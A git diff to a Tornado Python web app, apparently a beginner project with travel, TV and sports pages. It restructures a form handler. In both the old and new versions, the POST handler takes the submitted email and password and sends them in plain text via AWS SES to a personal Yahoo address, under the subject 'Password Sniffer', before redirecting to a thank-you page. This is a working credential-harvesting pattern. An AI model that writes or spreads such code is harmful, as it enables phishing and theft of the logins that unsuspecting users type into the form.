@@ -51,34 +51,35 @@ class SportsHandler(TemplateHandler):
 
 
 class PageHandler(TemplateHandler):
-  def post (self, page):
-    email = self.get_body_argument('email')
-    password = self.get_body_argument('password')
-
-    response = SES_CLIENT.send_email(
-      Destination={
-        'ToAddresses': ['richiewong07@yahoo.com'],
-      },
-      Message={
-        'Body': {
-          'Text': {
-            'Charset': 'UTF-8',
-            'Data': 'Email: {}\nPassword: {}\n'.format(email, password),
-          },
-        },
-        'Subject': {'Charset': 'UTF-8', 'Data': 'Password Sniffer'},
-      },
-      Source='richie@richiewong07.com',
-    )
-    # self.write('Thanks got your data<br>')
-    # self.write('Email: ' + email)
-    self.redirect('/thank-you-for-submitting')
-
-def get(self, page):
+    def get(self):
         self.set_header(
           'Cache-Control',
           'no-store, no-cache, must-revalidate, max-age=0')
         self.render_template("form_sample.html", {})
+
+    def post (self):
+        email = self.get_body_argument('email')
+        password = self.get_body_argument('password')
+
+        response = SES_CLIENT.send_email(
+          Destination={
+            'ToAddresses': ['richiewong07@yahoo.com'],
+          },
+          Message={
+            'Body': {
+              'Text': {
+                'Charset': 'UTF-8',
+                'Data': 'Email: {}\nPassword: {}\n'.format(email, password),
+              },
+            },
+            'Subject': {'Charset': 'UTF-8', 'Data': 'Password Sniffer'},
+          },
+          Source='richie@richiewong07.com',
+        )
+        # self.write('Thanks got your data<br>')
+        # self.write('Email: ' + email)
+        self.redirect('homepage/thankyou')
+
 
 def make_app():
   return tornado.web.Application([
@@ -86,7 +87,7 @@ def make_app():
     (r"/travel", TravelHandler),
     (r"/tv_shows", TvShowsHandler),
     (r"/sports", SportsHandler),
-    (r"sample", PageHandler),
+    (r"form_sample", PageHandler),
     (
       r"/static/(.*)",
       tornado.web.StaticFileHandler,
